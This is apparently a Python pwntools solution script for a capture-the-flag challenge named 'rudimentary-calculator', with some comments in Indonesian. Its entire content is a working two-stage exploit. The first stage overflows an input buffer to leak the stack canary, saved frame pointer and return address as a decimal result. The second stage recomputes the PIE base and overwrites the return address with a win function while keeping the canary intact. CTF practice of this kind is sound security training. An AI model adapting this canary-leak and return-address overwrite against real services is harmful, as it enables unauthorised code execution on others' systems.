#!/usr/bin/env python3
from pwn import *
import re
import os

HOST = "rudimentary-calculator.instances.ctf.l3ak.team"
PORT = 1337

context.log_level = "info"
context.arch = "amd64"

WIN_OFF = 0x1289
RET_AFTER_RUN_OFF = 0x1a9b

OFF_LEN = 0x1000
OFF_CANARY = 0x1188

# product_bignum starts at buf+0x1004.
# Need limbs through saved RIP:
# canary: limbs 97,98
# saved rbp: limbs 99,100
# saved rip: limbs 101,102
LEAK_LIMBS = 103


def start():
    if args.LOCAL:
        return process("./chall")
    return remote(HOST, PORT, ssl=True)


def recv_prompt(p):
    return p.recvuntil(b"Enter an expression> ")


def limbs_from_decimal(s, count):
    n = int(s)
    limbs = []
    for _ in range(count):
        limbs.append(n & 0xffffffff)
        n >>= 32
    return limbs


def leak_payload():
    # "1\x00" membuat parser berhenti cepat,
    # tapi scanf tetap sudah menulis overflow sampai product_bignum_len.
    payload = b"1\x00"
    payload = payload.ljust(OFF_LEN, b"A")
    payload += p32(LEAK_LIMBS)
    return payload


def exploit_payload(canary, saved_rbp, win):
    payload = b"1\x00"
    payload = payload.ljust(OFF_LEN, b"A")

    # Jaga parser aman: len = 1, product[0] = 1
    payload += p32(1)
    payload += p32(1)

    payload = payload.ljust(OFF_CANARY, b"B")
    payload += p64(canary)
    payload += p64(saved_rbp)
    payload += p64(win)
    return payload


p = start()

recv_prompt(p)

# Stage 1: leak stack as decimal bignum
p.sendline(leak_payload())
data = p.recvuntil(b"Enter an expression> ")

m = re.search(rb"Result: ([0-9]+)", data)
if not m:
    log.failure("Leak gagal, output:")
    print(data.decode(errors="ignore"))
    exit(1)

limbs = limbs_from_decimal(m.group(1), LEAK_LIMBS)

canary = (limbs[98] << 32) | limbs[97]
saved_rbp = (limbs[100] << 32) | limbs[99]
saved_rip = (limbs[102] << 32) | limbs[101]

pie_base = saved_rip - RET_AFTER_RUN_OFF
win = pie_base + WIN_OFF

log.success(f"canary    = {canary:#x}")
log.success(f"saved_rbp = {saved_rbp:#x}")
log.success(f"saved_rip = {saved_rip:#x}")
log.success(f"pie_base  = {pie_base:#x}")
log.success(f"win       = {win:#x}")

# Stage 2: overwrite RIP, keep canary valid
p.sendline(exploit_payload(canary, saved_rbp, win))

# Consume result prompt after exploit expression
p.recvuntil(b"Enter an expression> ")

# Trigger return from run()
p.sendline(b"quit")

p.interactive()
